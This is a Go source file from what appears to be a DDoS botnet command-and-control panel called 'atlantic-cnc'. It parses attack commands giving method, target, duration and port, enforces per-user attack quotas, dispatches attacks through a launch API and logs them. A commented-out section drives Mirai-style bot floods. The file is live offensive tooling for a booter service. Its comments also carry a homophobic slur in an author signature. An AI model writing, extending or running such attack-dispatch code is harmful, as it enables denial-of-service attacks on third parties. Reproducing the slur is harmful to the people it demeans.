package attacks

import (
	"log"
	"strconv"
	"strings"
	"time"
	
	"atlantic-cnc/core/attack/launch"
	"atlantic-cnc/core/functions"
	"atlantic-cnc/core/mysql"
	"atlantic-cnc/core/sessions/sessions"
	"atlantic-cnc/core/models/middleware/attack_sort"
	"atlantic-cnc/core/models/client/terminal"
//	"atlantic-cnc/core/models/json/build"
//        "atlantic-cnc/core/sessions/animations" mert was here yoooo
)

var (
        AttackDebug = false
        Spinners = false
)

func New_Attack(cmd []string, session *sessions.Session_Store) {


	if len(cmd) <= 2 || len(cmd) == 0 {
		session.Channel.Write([]byte("unknown syntax error\r\n"))
		session.Channel.Write([]byte("example: [method] [target] [duration] [port]\r\n"))
		session.Channel.Write([]byte("entered: "))
		for LenCon := 0; LenCon < len(cmd); LenCon++ {
			session.Channel.Write([]byte(cmd[LenCon]+" "))
		}
		session.Channel.Write([]byte("\r\n"))
		return
	}
        if functions.Status == "disable" {
		session.Channel.Write([]byte("Attacks has been disabled.\r\n"))
		return
	} else if functions.Status == "enable" {
//        Mirai := attack_launch.Fetch(cmd[0])
//        if Mirai == nil {
		Method := attacksort.Get(strings.ToLower(cmd[0]))
		if Method == nil {
			session.Channel.Write([]byte("\""+cmd[0]+"\" is a unrecognized attack command!\r\n"))
			return
		}

		DurationINT, error := strconv.Atoi(cmd[2])
		if error != nil {
			session.Channel.Write([]byte("\""+cmd[2]+"\", duration must be an integer!\r\n"))
			return
		}

		var Port string

		if len(cmd) >= 4 {
			_, error := strconv.Atoi(cmd[3])
			if error != nil {
				session.Channel.Write([]byte("\""+cmd[3]+"\", port must be an integer!\r\n"))
				return
			}
			Port = cmd[3]
		} else {
			session.Channel.Write([]byte("Default port selected (:"+strconv.Itoa(Method.DefaultPort)+")\r\n"))
			Port = strconv.Itoa(Method.DefaultPort)
		}
		PortINT, error := strconv.Atoi(Port)
		if error != nil {
			session.Channel.Write([]byte("\""+cmd[2]+"\", port must be an integer!\r\n"))
			return
		}

		if session.User.Maxtime != 0 && DurationINT > session.User.Maxtime {
			terminal.Banner("user_overattacktime", session.User, session.Channel, true, false, nil)
			return
		}
	        if !(functions.IsIPv4(cmd[1]) || functions.IsIPv6(cmd[1]) || functions.IsDomain(cmd[1])) {
        		session.Channel.Write([]byte("  You have sent an invalid target.\r\n"))
                	return
	        }
		Ammount, error := database.GetRunningUser(session.User.Username); if error != nil {
			if session.User.Administrator {
				session.Channel.Write([]byte("mert was here but also	An error occurred while trying to attack this target: "+error.Error()+"\r\n"))
				return
			}
			session.Channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
			return
		}

		MyRunning, err := database.MyAttacking(session.User.Username)
		if err != nil {
			if session.User.Administrator {
				session.Channel.Write([]byte("	An error occurred while trying to attack this target: "+error.Error()+"\r\n"))
				return
			}
			session.Channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
			return
		}

		if len(MyRunning) != 0 {

			if session.User.Concurrents <= Ammount {
				terminal.Banner("user_maxconns", session.User, session.Channel, true, false, nil)
				return
			}

			var recent *database.Attack = MyRunning[0]

			for _, attack := range MyRunning {

				if attack.Created > recent.Created {
					recent = attack
					continue
				}
			}
		}

        	    var New = &attack_launch.Attack{
			Target: cmd[1],
			Port: Port,
			Duration: cmd[2],
			Method: cmd[0],
        	    }
	            AttackTokenURL := attack_launch.Parse(cmd[0], New)
        	    if AttackTokenURL == "" {
			session.Channel.Write([]byte("\""+cmd[0]+"\" is a unrecognized attack command!\r\n"))
			return
        	    }
	            Allowed := attack_launch.ParseLaunch(AttackTokenURL)
	            if !Allowed {
		        var CommandCSM = map[string]string {
				"method":cmd[0],
				"target":cmd[1],
				"port":Port,
				"duration":cmd[2],
			}
			terminal.Banner("attack_failed", session.User, session.Channel, true, false, CommandCSM)
			return
	           }
        	   if Logged, error := database.LogAttack(&database.Attack{Username: session.User.Username, Target: cmd[1], Method: cmd[0], Port: PortINT, Duration: DurationINT, End: time.Now().Add(time.Duration(DurationINT * int(time.Second))).Unix(), Created: time.Now().Unix()}); error != nil || !Logged {
	        	log.Println(error)
			session.Channel.Write([]byte("	Failed to correctly log your attack command"))
        	   }
	           session.Attacks++

        	   var CommandCSM = map[string]string {
			"broadcast":strconv.Itoa(0),
			"method":cmd[0],
			"target":cmd[1],
			"port":Port,
			"duration":cmd[2],
	           }

	           if session.CurrentTheme == nil {
		        terminal.Banner("attack-sent", session.User, session.Channel, true, false, CommandCSM)
			return
	           } else {
			terminal.Banner(strings.Split(session.CurrentTheme.Views_AttackSplash, "/")[1], session.User, session.Channel, true, false, CommandCSM)
			return
		   }
//        }
/*        else if Mirai != nil {
		PortParsed, error := strconv.Atoi(Port); if error != nil {
			Port = Mirai.DefaultPort // m.e....r.t.r.....u.n.s.y.o.u.f.a.g.g.....o.t.s
			DefaultPort = true
                }
		Duration, error := strconv.Atoi(Time); if error != nil {
	                session.Channel.Write([]byte("  Attack Time must be an int\r\n"))
			return
        	}
                if !(functions.IsIPv4(cmd[1]) || functions.IsIPv6(cmd[1]) || functions.IsDomain(cmd[1])) {
                        session.Channel.Write([]byte("  You have sent an invalid target.\r\n"))
                        return
                } //mert runs ur balls 1336
		if session.User.Maxtime != 0 && DurationINT > session.User.Maxtime {
                        terminal.Banner("user_overattacktime", session.User, session.Channel, true, false, nil)
                        return
                }
		Ammount, error := database.GetRunningUser(session.User.Username); if error != nil {
                        if session.User.Administrator {
                                session.Channel.Write([]byte("  An error occurred while trying to attack this target: "+error.Error()+"\r\n"))
                                return
                        }
                        session.Channel.Write([]byte("  An error occurred while trying to attack this target\r\n"))
                        return
                }

                MyRunning, err := database.MyAttacking(session.User.Username)
                if err != nil {
                        if session.User.Administrator {
                                session.Channel.Write([]byte("  An error occurred while trying to attack this target: "+error.Error()+"\r\n"))
                                return
                        }
                        session.Channel.Write([]byte("  An error occurred while trying to attack this target\r\n"))
                        return
                }
		if len(MyRunning) != 0 {

                        if session.User.Concurrents <= Ammount {
                                terminal.Banner("user_maxconns", session.User, session.Channel, true, false, nil)
                                return
                        } // m.e.r.t.r.u.n.s.y.o.u.f.a.g.g.o.t.s

                        var recent *database.Attack = MyRunning[0]
                        for _, attack := range MyRunning {
                                if attack.Created > recent.Created {
                                        recent = attack
                                        continue
                                }
                        }
                }
                error := attack_launch.Launch(cnd[1], Duration, cmd[3], Mirai); if error != nil {
                        session.Channel.Write([]byte("  An error occurred while trying to attack this target\r\n"))
                        return
                } else {
                   	if session.CurrentTheme == nil {
	                        terminal.Banner("attack-sent", session.User, session.Channel, true, false, Method)
                                return
        	        } else {
                	        terminal.Banner(strings.Split(session.CurrentTheme.Views_AttackSplash, "/")[1], session.User, session.Channel, true, false, Method)
                        	return // m.e.r.t..r.u.n.s.y..o.u.f..a.g.g.o.t.s
	                }
		        if Logged, error := database.LogAttack(&database.Attack{Username: session.User.Username, Target: cmd[1], Method: cmd[0], Port: PortINT, Duration: DurationINT,End: time.Now().Add(time.Duration(DurationINT * int(time.Second))).Unix(), Created: time.Now().Unix()}); error != nil || !Logged {
	                        log.Println(error)
        	                session.Channel.Write([]byte("  Failed to correctly log your attack command"))
                	}
                        session.Attacks++
                }

                return
        }*/
	}
}
